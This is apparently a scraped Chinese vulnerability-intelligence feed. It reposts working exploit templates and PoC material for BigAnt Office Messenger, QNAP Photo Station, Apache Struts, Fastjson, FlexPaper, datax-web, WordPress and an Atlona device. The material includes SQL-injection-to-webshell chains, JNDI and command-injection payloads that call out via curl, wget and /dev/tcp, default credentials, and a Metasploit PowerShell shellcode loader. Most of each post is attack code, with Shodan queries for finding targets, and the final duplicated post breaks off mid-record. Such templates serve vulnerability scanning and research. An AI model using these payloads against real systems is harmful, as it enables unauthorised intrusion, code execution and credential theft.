posts.title: BigAnt Office Messenger SQL注入漏洞
posts.text: 漏洞信息漏洞名称： BigAnt Office Messenger SQL注入漏洞 漏洞编号： CVE： CVE-2024-54761 漏洞类型： SQL注入 漏洞等级： 严重 漏洞描述： BigAnt Office Messenger 5.6.06中存在一个严重的SQL注入漏洞，允许未经身份验证的远程攻击者通过滥用MySQL的SELECT … INTO OUTFILE功能执行任意系统命令。攻击链有条件地将一个瞬时的PHP webshell写入磁盘，执行system('id')，并通过unlink()立即自毁。这不会留下可追踪的痕迹，且不需要身份验证。利用此漏洞需要MySQL的FILE权限和可写的webroot目录，这在Windows上的默认或配置不当的部署中常见。此CVE模仿了一个完整的杀伤链，使攻击者能够在3个请求内从未经身份验证的输入到精确的瞬时代码执行。威胁行为者可能将此作为针对基于Windows的内部协作软件的初始立足点向量，这些软件具有提升的服务上下文。 产品厂商： BigAntSoft 产品名称： Office Messenger 影响版本： 5.6.06 搜索语法： http.html:”BigAnt Office Messenger” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/c8fa05603431cbc0939ab7f9423bee34a79d4277/http%2Fcves%2F2025%2FCVE-2024-54761.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105id: cve-2024-54761-chaininfo: name: BigAnt Office Messenger 5.6.06 - Stealth RCE via SQL Injection (Ephemeral OUTFILE Chain) author: 3th1c_yuk1, x-stp severity: critical description: | A critical SQL injection vulnerability in BigAnt Office Messenger 5.6.06 allows remote unauthenticated attackers to execute arbitrary system commands by abusing MySQL's SELECT ... INTO OUTFILE functionality. The attack chain conditionally writes a transient PHP webshell to disk, executes `system('id')`, and immediately self-destructs via unlink(). This leaves no traceable artifact and requires no authentication. Exploitation is contingent on MySQL's FILE privilege and a writable webroot directory, commonly observed in default or misconfigured deployments on Windows. This CVE mimics a full killchain, enabling attackers to move from unauthenticated input to precise ephemeral code execution — all in under 3 requests. Threat actors may leverage this as an initial foothold vector in targeted intrusions against Windows-based internal collaboration software with elevated service contexts. reference: - https://github.com/nscan9/CVE-2024-54761-BigAnt-Office-Messenger-5.6.06-RCE-via-SQL-Injection - https://nvd.nist.gov/vuln/detail/CVE-2024-54761 metadata: verified: true max-request: 5 vendor: BigAntSoft product: Office Messenger shodan-query: http.html:"BigAnt Office Messenger" fofa-query: body="BigAnt Office" exploit-type: RCE cwe-id: CWE-89 attack-surface: remote privilege-required: none user-interaction: none exploit-chain: sql-injection→file-write→rce→self-clean tags: cve,cve2024,bigant,sql-injection,rce,webroot,ephemeral,unlink,windows,filewrite,chain,killchain,noauth,criticalvariables: checkfile: "{{randstr}}.txt" shellfile: "{{randstr}}.phtml" marker: "BigAntOM-{{randstr}}" payload: "<?php echo '{{marker}}'; system('id'); unlink(__FILE__); ?>"http: - id: outfile-check raw: - | GET /index.php/Admin/user/index/clientid/1.html?dev_code=';SELECT+'{{marker}}'+INTO+OUTFILE+'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/{{checkfile}}'-- HTTP/1.1 Host: {{Hostname}} matchers: - type: status status: - 200 - id: verify-checkfile method: GET path: - "{{BaseURL}}/{{checkfile}}" matchers: - type: word part: body words: - "{{marker}}" - id: drop-shell raw: - | GET /index.php/Admin/user/index/clientid/1.html?dev_code=';SELECT+CHAR({{payload | to_char }})+INTO+OUTFILE+'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/{{shellfile}}'-- HTTP/1.1 Host: {{Hostname}} stop-at-first-match: true matchers: - type: status status: - 200 - id: execute-shell raw: - | GET /{{shellfile}} HTTP/1.1 Host: {{Hostname}} matchers: - type: word condition: and part: body words: - "{{marker}}" - "uid=" - "gid=" - "groups=" - id: cleanup-confirmation method: GET path: - "{{BaseURL}}/{{shellfile}}" matchers: - type: status status: - 404

posts.title: Pterodactyl Path Traversal Vulnerability
posts.text: 漏洞信息漏洞名称： Pterodactyl Path Traversal Vulnerability 漏洞编号： CVE： CVE-2025-49132 漏洞类型： 目录遍历 漏洞等级： 高危 漏洞描述： 该漏洞存在于Pterodactyl Panel中，允许攻击者通过locale.json文件进行路径遍历攻击。攻击者需要访问暴露的Redis服务器和面板URL，通过获取服务器配置文件中的APP_KEY和Redis数据库密码及IP，使用forge_cookie生成pterodactyl_session cookie，进而访问Pterodactyl API。此脚本仅用于教育目的，使用时需确保获得目标系统的测试权限。 产品厂商： pterodactyl 产品名称： Pterodactyl Panel 来源： https://github.com/typicalsmc/CVE-2025-49132-PoC 类型： CVE-2025:github search 仓库文件 LICENSE README.md forge_cookie.py illuminate-decryptor.py 来源概述Guide to use script that exploit the Pterodactyl Path Traversal at locale.jsonRequirements Exposed Redis Server Panel URL Guide Get access to the server configuration file, which has APP_KEY and Redis Database Password + IP Use forge_cookie to generate a pterodactyl_session cookie Use that cookie to access Pterodactyl API Note This script is for educational purposes only. Use it responsibly and ensure you have permission to test the target system. Logging in through the panel webpanel can not be done due to requirement of “remember_token” which is stored in the SQL Database. Only accessing the API is possible with the forged cookie. Tried on panel.ahihimc.net but they patched the redis port before im able to report joy :sad:

posts.title: WordPress SQL注入漏洞
posts.text: 漏洞信息漏洞名称： WordPress SQL注入漏洞 漏洞编号： CVE： CVE-2024-9796 漏洞类型： SQL注入 漏洞等级： 高危 漏洞描述： CVE-2024-9796是一个WordPress的SQL注入漏洞，允许攻击者转储WordPress用户及其哈希值。此漏洞的利用脚本仅供教育用途，禁止用于非法目的。 产品厂商： WordPress 产品名称： WordPress 来源： https://github.com/BwithE/CVE-2024-9796 类型： CVE-2024:github search 仓库文件 README.md poc.py 来源概述CVE-2024-9796PoC SQL injection to dump WordPress users and hashes.Disclaimer:This script is for educational use only. Do not use it for illegal purposes. If you do, it’s entirely your responsibility; I am not liable for any misuse. More information on the exploithttps://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/ Usage:123456789## Successful attemptpython3 poc.py -i 127.0.0.1[!] 127.0.0.1 has been PWNed!admin:$P$H5blBNpO5AVI7eDJJi95E6pso16h981user:$P$H1Sa1pcnzwWha3G9XH5rkfB6wOcE2a1## unsuccessful attemptpython3 poc.py -i 127.0.0.1[!] Doesn't look vulnerable.. Find another way in!

posts.title: QNAP Photo Station 预认证远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： QNAP Photo Station 预认证远程代码执行漏洞 漏洞编号： CVE： CVE-2019-7194 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： QNAP Photo Station 6.0.3之前的版本存在多个漏洞，当这些漏洞被串联利用时，可实现未经认证的远程代码执行（RCE）。这包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感系统文件。为了降低这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。 产品厂商： QNAP 产品名称： QNAP Photo Station 影响版本： < 6.0.3 来源： https://github.com/projectdiscovery/nuclei-templates/blob/5f7315c5558c04879104cf2e6e5ed3e73164be55/http%2Fcves%2F2019%2FCVE-2019-7194.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124id: qnap-photostation-CVE-2019-7194-preauth-rceinfo: name: QNAP Photo Station < 6.0.3 pre-auth RCE author: x-stp severity: critical description: | QNAP Photo Station versions prior to 6.0.3 contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE). This includes a flaw involving external control of file names or paths, allowing attackers to access or modify sensitive system files. To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions. reference: - https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2019-7192,CVE-2019-7193,CVE-2019-7194,CVE-2019-7195 cwe-id: CWE-78 tags: cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,pocvariables: command_payload: '%3C%3F%3d%60%24_POST%5Bx%5D%60%3f%3e%40s.tp' dropper_command: "x= echo $((0x2C06*1337))" dropper_filename: "{{to_lower(rand_text_alpha(6))}}"http: - method: POST path: - "{{BaseURL}}/photo/p/api/album.php" headers: Content-Type: application/x-www-form-urlencoded body: "a=setSlideshow&f=qsamplealbum" extractors: - type: regex name: album_id group: 1 internal: true regex: - "<output>([a-zA-Z0-9]+)</output>" - method: GET path: - "{{BaseURL}}/photo/slideshow.php?album={{album_id}}" extractors: - type: regex name: access_code group: 1 internal: true regex: - "encodeURIComponent\\('([A-Za-z0-9%]+)'\\)" - type: regex part: header name: phpsessid group: 1 internal: true regex: - "PHPSESSID=([a-z0-9]+);" - method: POST path: - "{{BaseURL}}/photo/p/api/video.php" headers: Content-Type: application/x-www-form-urlencoded Cookie: "PHPSESSID={{phpsessid}}" body: "a=caption&f=UMGObv&album={{album_id}}&ac={{access_code}}&filename=../../../../../share/Multimedia/.@__thumb/ps.app.token" extractors: - type: regex name: app_token internal: true group: 1 regex: - "([a-f0-9]{32})" - method: POST path: - "{{BaseURL}}/cgi-bin/authLogin.cgi" headers: Content-Type: "application/x-www-form-urlencoded" body: "app=PHOTO_STATION&auth=1&app_token={{app_token}}" extractors: - type: regex part: body name: nas_sid internal: true group: 1 regex: - '<authSid><!\[CDATA\[([a-z0-9]+)\]\]></authSid>' - method: POST path: - "{{BaseURL}}/cgi-bin/userConfig.cgi?sid={{nas_sid}}" headers: Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Cookie: "DESKTOP=1; WINDOW_MODE=1; NAS_SID={{nas_sid}}; PHPSESSID={{phpsessid}}" body: "func=addPersonalSmtp&provider_idx=0&sender={{command_payload}}&default=0&smtp_server=0.0.0.0&port=25&security=-1&email_account=a%40b.com&email_passwd=ac1db1tch3z" - method: GET path: - "{{BaseURL}}/photo/slideshow.php?album=qsamplealbum" headers: Cookie: "QMS_SID=../../../../../../../../../../mnt/ext/opt/photostation2/{{dropper_filename}}.php; PHPSESSID={{phpsessid}}; NAS_SID={{nas_sid}}; DESKTOP=1; CACHE={{randstr}};" - method: POST path: - "{{BaseURL}}/photo/{{dropper_filename}}.php" headers: Content-Type: application/x-www-form-urlencoded # oh well.. use that cookie jar again here.. Cookie: "PHPSESSID={{phpsessid}}; NAS_SID={{nas_sid}}" body: "{{dropper_command}}" matchers-condition: and matchers: - type: status status: - 200 - type: word part: body words: - "NASVARS" - type: word part: body words: - "15067990" # magic.

posts.title: Metasploit Framework 随机函数名冲突漏洞
posts.text: 漏洞信息漏洞名称： Metasploit Framework 随机函数名冲突漏洞 漏洞类型： 其他 漏洞等级： 低危 漏洞描述： Metasploit Framework中的msfvenom工具在生成psh-cmd payload时，随机生成的PowerShell函数名可能与内置命令冲突。例如，生成的函数名’rV’与’Remove-Variable’的短名’rV’冲突，可能导致脚本执行失败。 产品厂商： Rapid7 产品名称： Metasploit Framework 影响版本： 6.4.68 来源： https://github.com/rapid7/metasploit-framework/issues/20331 类型： rapid7/metasploit-framework:github issues 来源概述Steps to reproduceHow’d you do it? msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh-cmd LHOST=x.x.x.x LPORT=xxx Unwrap the base64 part inside the payload to reveal the actual powershell script Unwrap the compression and base64 part once more Now we get the actual evil powershell script that loads the shellcode Notice variables and functions have random names Were you following a specific guide/tutorial or reading documentation?No Expected behaviorvariable and function names shouldn’t collide with existing ones Current behaviorThere’s a chance that it will collide. In my case: 1234567891011121314151617181920212223242526272829function xSb5N { Param ($nmO, $u3F) $rZx = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') return $rZx.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($rZx.GetMethod('GetModuleHandle')).Invoke($null, @($nmO)))), $u3F))}function rv { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $hepi, [Parameter(Position = 1)] [Type] $tB3YT = [Void] ) $qI = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) $qI.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $hepi).SetImplementationFlags('Runtime, Managed') $qI.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $tB3YT, $hepi).SetImplementationFlags('Runtime, Managed') return $qI.CreateType()}[Byte[]]$wU7 = [System.Convert]::FromBase64String("")[Uint32]$xMiq = 0$wqX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xSb5N kernel32.dll VirtualAlloc), (rv @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $wU7.Length,0x3000, 0x04)[System.Runtime.InteropServices.Marshal]::Copy($wU7, 0, $wqX, $wU7.length)if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xSb5N kernel32.dll VirtualProtect), (rv @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($wqX, [Uint32]$wU7.Length, 0x10, [Ref]$xMiq)) -eq $true) { $a9ffs = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xSb5N kernel32.dll CreateThread), (rv @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$wqX,[IntPtr]::Zero,0,[IntPtr]::Zero) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xSb5N kernel32.dll WaitForSingleObject), (rv @([IntPtr], [Int32]))).Invoke($a9ffs,0xffffffff) | Out-Null} 2nd function collides with Remove-Variable‘s shortname: rv Metasploit version6.4.68 Additional InformationNone

posts.title: Apache Struts 任意文件上传远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： Apache Struts 任意文件上传远程代码执行漏洞 漏洞编号： CVE： CVE-2023-50164 漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： Apache Struts存在一个任意文件上传漏洞，编号为CVE-2023-50164，允许攻击者通过构造特定的上传请求实现远程代码执行。此漏洞需要指定易受攻击的上传端点。 产品厂商： Apache 产品名称： Struts 来源： https://github.com/projectdiscovery/nuclei-templates/blob/f3a4b1cd410d9c1722c7cbe279e4826810c1ef81/cves%2F2023%2Fcve-2023-50164.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970id: struts-file-upload-rceinfo: name: Apache Struts - Arbitrary File Upload RCE author: 00xmora severity: critical description: | Apache Struts CVE-2023-50164 Remote Code Execution. This template is generic and requires specifying the vulnerable upload endpoint via the -u flag. Example usage: nuclei -t cves/2023/cve-2023-50164.yaml -u http://target.com/upload.action reference: - https://nvd.nist.gov/vuln/detail/CVE-2023-50164 - https://github.com/NikitaPark/CVE-2023-50164-PoC classification: cve-id: CVE-2023-50164 cwe-id: CWE-22 tags: cve,cve2023,struts,rce,fileupload,traversal,intrusivevariables: shellname: "shell_{{randstr}}.jsp" shellcontent: "<% out.println(\"NUCLEI-RCE-{{randstr}}\"); %>"requests: - raw: - | POST {{BaseURL}} HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKQeAnc4Qm964UwhY Accept-Encoding: gzip ------WebKitFormBoundaryKQeAnc4Qm964UwhY Content-Disposition: form-data; name="Upload"; filename="{{shellname}}" Content-Type: text/plain {{shellcontent}} ------WebKitFormBoundaryKQeAnc4Qm964UwhY Content-Disposition: form-data; name="uploadFileName" {{traversal}}webapps/ROOT/{{shellname}} ------WebKitFormBoundaryKQeAnc4Qm964UwhY-- payloads: traversal: - "../" - "../../" - "../../../" attack: clusterbomb matchers: - type: status status: - 200 - type: word words: - "text/html" part: header - method: GET path: - "{{BaseURL}}/{{shellname}}" matchers: - type: word words: - "NUCLEI-RCE-{{randstr}}" part: body

posts.title: Fastjson 反序列化远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： Fastjson 反序列化远程代码执行漏洞 漏洞编号： CVE： CVE-2017-18349 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Fastjson在1.2.25之前的版本中，parseObject方法存在远程代码执行漏洞。攻击者可以通过构造恶意的JSON请求，利用@type注解触发不安全的JdbcRowSetImpl反序列化，从而执行任意代码。此漏洞影响了Pippo 1.11.0中的FastjsonEngine以及其他使用易受攻击Fastjson版本的产品。成功利用此漏洞可能导致系统完全被攻陷，攻击者可以执行任意命令、访问敏感数据并在目标系统上建立持久后门。 产品厂商： alibaba 产品名称： fastjson 影响版本： version < 1.2.25 来源： https://github.com/projectdiscovery/nuclei-templates/blob/273970a87fd4961990cf390639c9db173092d040/http%2Fcves%2F2017%2FCVE-2017-18349.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情: CVE-2017-18349info: name: Fastjson Insecure Deserialization - Remote Code Execution author: night severity: critical description: | Fastjson before 1.2.25 contains a remote code execution vulnerability in parseObject method. The vulnerability allows remote attackers to execute arbitrary code via crafted JSON requests containing malicious @type annotations that trigger unsafe deserialization of JdbcRowSetImpl. This affects FastjsonEngine in Pippo 1.11.0 and other products using vulnerable Fastjson versions. impact: | Successful exploitation allows complete system compromise through remote code execution, enabling attackers to execute arbitrary commands, access sensitive data, and establish persistent backdoors on the target system. remediation: | Update Fastjson to version 1.2.25 or later which includes security patches for this vulnerability. Implement additional security measures: disable autotype functionality by setting fastjson.parser.autoTypeSupport=false, implement strict whitelist filtering for @type annotations, validate and sanitize all JSON input, use Web Application Firewalls (WAF) to filter malicious requests, and regularly audit dependencies for known vulnerabilities. Consider migrating to safer JSON parsing libraries like Jackson with secure configurations. reference: - https://nvd.nist.gov/vuln/detail/CVE-2017-18349 - https://github.com/alibaba/fastjson/wiki/security_update_20170315 - https://github.com/pippo-java/pippo/issues/466 - https://github.com/h0cksr/Fastjson--CVE-2017-18349- - https://fortiguard.com/encyclopedia/ips/44059 - https://www.exploit-db.com/exploits/45983 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2017-18349 cwe-id: CWE-502 cpe: cpe:2.3:a:alibaba:fastjson:*:*:*:*:*:*:*:* epss-score: 0.97435 epss-percentile: 0.99951 metadata: verified: true max-request: 4 vendor: alibaba product: fastjson tags: cve,cve2017,fastjson,deserialization,rce,critical,intrusivevariables: rmi_payload: "rmi://{{interactsh-url}}/{{randstr}}" ldap_payload: "ldap://{{interactsh-url}}/{{randstr}}"http: - method: POST path: - "{{BaseURL}}/json" - "{{BaseURL}}/api/json" headers: Content-Type: application/json Accept: application/json User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0" body: | { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "{{rmi_payload}}", "autoCommit": true } stop-at-first-match: true matchers: - type: word part: interactsh_protocol words: - "dns" - "http" extractors: - type: kval kval: - interactsh_ip - interactsh_request - method: POST path: - "{{BaseURL}}/json" - "{{BaseURL}}/api/json" - "{{BaseURL}}/parse" - "{{BaseURL}}/deserialize" headers: Content-Type: application/json Accept: application/json User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0" body: | { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "{{ldap_payload}}", "autoCommit": true } matchers: - type: word part: interactsh_protocol words: - "dns" - "http" extractors: - type: kval kval: - interactsh_ip - interactsh_request - method: POST path: - "{{BaseURL}}/json" - "{{BaseURL}}/api/json" - "{{BaseURL}}/parse" - "{{BaseURL}}/deserialize" headers: Content-Type: application/json Accept: application/json User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0" body: | { "data": { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "{{rmi_payload}}", "autoCommit": true } } matchers: - type: word part: interactsh_protocol words: - "dns" - "http" extractors: - type: kval kval: - interactsh_ip - interactsh_request - method: POST path: - "{{BaseURL}}/json" headers: Content-Type: application/json Accept: application/json User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0" body: | { "b": { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "{{ldap_payload}}", "autoCommit": true } } matchers: - type: word part: interactsh_protocol words: - "dns" - "http" extractors: - type: kval kval: - interactsh_ip - interactsh_request

posts.title: FlexPaper 远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： FlexPaper 远程代码执行漏洞 漏洞编号： CVE： CVE-2018-11686 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： FlexPaper (FlowPaper) 2.3.6版本中的setup.php和change_config.php存在不安全处理，允许远程攻击者执行任意代码，成功利用此漏洞可能导致未授权访问、数据泄露以及目标系统的潜在危害。 产品厂商： flowpaper 产品名称： flexpaper 影响版本： version <= 2.3.6 来源： https://github.com/projectdiscovery/nuclei-templates/blob/932f223de1837eb1abf2719b28cca509d97ad870/http%2Fcves%2F2018%2FCVE-2018-11686.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748id: CVE-2018-11686info: name: FlexPaper - Remote Code Execution author: mpgn, pszyszkowski severity: critical description: | FlexPaper (FlowPaper) 2.3.6 contains a remote code execution caused by insecure handling in setup.php and change_config.php, letting remote attackers execute arbitrary code, exploit requires access to these scripts. impact: | Successful exploitation of this vulnerability can lead to unauthorized access, data leakage, and potential compromise of the target system. remediation: | Update to version > 2.3.6. reference: - https://www.exploit-db.com/docs/english/46521-flexpaper-=-2.3.6-remote-code-execution-whitepaper.pdf - https://vulncheck.com/xdb/b67f601a7711 - https://github.com/mpgn/CVE-2018-11686 classification: cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2018-11686 cwe-id: CWE-20 cpe: cpe:2.3:a:flowpaper:flexpaper:*:*:*:*:*:*:*:* metadata: max-request: 1 vendor: flowpaper product: flexpaper tags: cve2018,cve,flexpaper,shell,rce,auth-bypass,intrusivevariables: callback: "ping%20-c1%20%7b%7binteractsh-url%7d%7d%20%7c%7c%20nslookup%20%7b%7binteractsh-url%7d%7d%20%7c%7c%20echo%201%20%3e%2fdev%2ftcp%2f%7b%7binteractsh-url%7d%7d%2f80%20%7c%7c%20curl%20http%3a%2f%2f%7b%7binteractsh-url%7d%7d%20-o%20%2fdev%2fnull%20%7c%7c%20wget%20http%3a%2f%2f%7b%7binteractsh-url%7d%7d%20-O%20%2fdev%2fnull%3b"http: - method: GET path: - "{{BaseURL}}/php/setup.php?step=4&PDF2SWF_PATH={{callback}}" stop-at-first-match: true matchers: - type: word part: interactsh_protocol words: - "dns" - type: word part: interactsh_protocol words: - "http"

posts.title: Atlona AT-OME-MS42 默认登录漏洞
posts.text: 漏洞信息漏洞名称： Atlona AT-OME-MS42 默认登录漏洞 漏洞类型： 弱口令 漏洞等级： 高危 漏洞描述： Atlona AT-OME-MS42是一款4x2矩阵切换器，支持HDMI、USB-C和DisplayPort输入。其网络接口存在默认凭证admin:Atlona，可能导致未授权访问。 产品厂商： Atlona 产品名称： AT-OME-MS42 来源： https://github.com/projectdiscovery/nuclei-templates/blob/a839da28ab6986167d67b071ea587a80e757eac0/http%2Fcves%2F2025%2FAT-OME-MS42-default-login.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情1234567891011121314151617181920212223242526id: AT-OME-MS42-default-logininfo: name: The Atlona AT-OME-MS42 Default Login author: matejsmycka severity: high description: The Atlona AT-OME-MS42 is a 4x2 matrix switcher with HDMI, USB-C, and DisplayPort inputs. It has a web interface with default credentials admin:Atlona. reference: - https://atlona.com/pdf/manuals/AT-OME-MS42_G.pdf tags: atlona, default-loginhttp: - raw: - | POST /cgi-bin/login.cgi?ssid={{base64('admin:Atlona')}} HTTP/1.1 Host: {{Hostname}} Content-Length: 0 matchers: - type: status status: - 200 - type: word words: - 'Login Success!'

posts.title: WeiYe-Jing datax-web 命令执行漏洞
posts.text: 漏洞信息漏洞名称： WeiYe-Jing datax-web 命令执行漏洞 漏洞编号： CVE： CVE-2023-7116 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： WeiYe-Jing datax-web 2.1.2版本中存在一个操作系统命令注入漏洞，该漏洞由于/api/log/killJob端点中的’processId’参数未经过适当的清理，导致远程攻击者可以在受影响的系统上执行任意命令。 产品厂商： WeiYe-Jing 产品名称： datax-web 影响版本： 2.1.2 搜索语法： app=”WeiYe-Jing-datax-web” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/239153bb48fc35eeedeb44e1a6fb9fec275af810/http%2Fcves%2F2023%2FCVE-2023-7116.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546id: CVE-2023-7116info: name: WeiYe-Jing datax-web - OS Command Injection author: pussycat0x severity: critical description: | WeiYe-Jing datax-web 2.1.2 contains an OS command injection vulnerability caused by improper sanitization of the 'processId' parameter in the /api/log/killJob endpoint. This allows remote attackers to execute arbitrary commands on the affected system. metadata: shodan-query: "app=\"WeiYe-Jing-datax-web\"" tags: cve,cve2023,rce,datax-web,oast,injection,unauthflow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers: - type: word part: body words: - "<title>Datax Web" - raw: - | POST /api/log/killJob HTTP/1.1 Host: {{Hostname}} Content-Type: application/json Accept: application/json {"processId":"1 & wget http://{{interactsh-url}}"} matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http" - type: status status: - 200

posts.title: WeiYe-Jing datax-web OS命令注入漏洞
posts.text: 漏洞信息漏洞名称： WeiYe-Jing datax-web OS命令注入漏洞 漏洞编号： CVE： CVE-2023-7116 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： WeiYe-Jing datax-web 2.1.2版本中的/api/log/killJob端点由于对’processId’参数的不当清理，存在操作系统命令注入漏洞。远程攻击者可以利用此漏洞在受影响的系统上执行任意命令。 产品厂商： WeiYe-Jing 产品名称： datax-web 影响版本： 2.1.2 搜索语法： app=”WeiYe-Jing-datax-web” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/309af6bb5b04f9973deda0b1df47b61b399709a6/http%2Fcves%2F2023%2FCVE-2023-7116.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情1234567891011121314151617181920212223242526272829303132333435363738394041424344id: CVE-2023-7116info: name: WeiYe-Jing datax-web - OS Command Injection author: pussycat0x severity: critical description: | WeiYe-Jing datax-web 2.1.2 contains an OS command injection vulnerability caused by improper sanitization of the 'processId' parameter in the /api/log/killJob endpoint. This allows remote attackers to execute arbitrary commands on the affected system. metadata: shodan-query: "app=\"WeiYe-Jing-datax-web\"" tags: cve,cve2023,rce,datax-web,oast,injection,unauthhttp: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers: - type: word part: body words: - "<title>Datax Web" - raw: - | POST /api/log/killJob HTTP/1.1 Host: {{Hostname}} Content-Type: application/json Accept: application/json {"processId":"1 & wget http://{{interactsh-url}}"} matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http" - type: status status: - 200

posts.title: QNAP Photo Station 预认证远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： QNAP Photo Station 预认证远程代码执行漏洞 漏洞编号： CVE： CVE-2019-7194 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： QNAP Photo Station 6.0.3之前的版本存在多个漏洞，当这些漏洞被串联利用时，可以实现未经认证的远程代码执行（RCE）。这包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感系统文件。为了减轻这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。 产品厂商： QNAP 产品名称： QNAP Photo Station 影响版本： < 6.0.3 来源： https://github.com/projectdiscovery/nuclei-templates/blob/47bd789b10e5f515a390168b2738717b09cb4477/http%2Fcves%2F2019%2FCVE-2019-7194.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124id: qnap-photostation-CVE-2019-7194-preauth-rceinfo: name: QNAP Photo Station < 6.0.3 pre-auth RCE author: x-stp severity: critical description: | QNAP Photo Station versions prior to 6.0.3 contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE). This includes a flaw involving external control of file names or paths, allowing attackers to access or modify sensitive system files. To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions. reference: - https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: 